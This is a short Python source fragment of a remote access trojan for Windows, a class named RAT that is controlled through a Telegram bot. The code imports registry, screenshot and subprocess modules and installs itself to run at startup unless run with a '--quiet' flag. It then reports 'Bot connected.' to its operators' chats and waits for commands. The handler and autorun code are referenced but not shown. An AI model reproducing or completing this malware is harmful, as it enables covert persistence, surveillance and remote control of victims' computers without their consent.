
import os
import sys
import time
import shutil
import winreg
import getpass
import telepot
import requests
import win32api
import winshell
import threading
import subprocess			
import encodings.idna
from PIL import ImageGrab
from telepot.loop import MessageLoop

class RAT:
	def __init__(self):
		try:
			if sys.argv[1] == "--quiet":
				pass
		except IndexError:
			self.set_autorun()
		
		MessageLoop(bot, self.bot_handler).run_as_thread()
		print("Bot connected.")
		for chat in trusted_chats:
			bot.sendMessage(chat, "Bot connected.")
		for user in trusted_users:
			bot.sendMessage(user, "Bot connected.")

		while True:
			time.sleep(10)
	
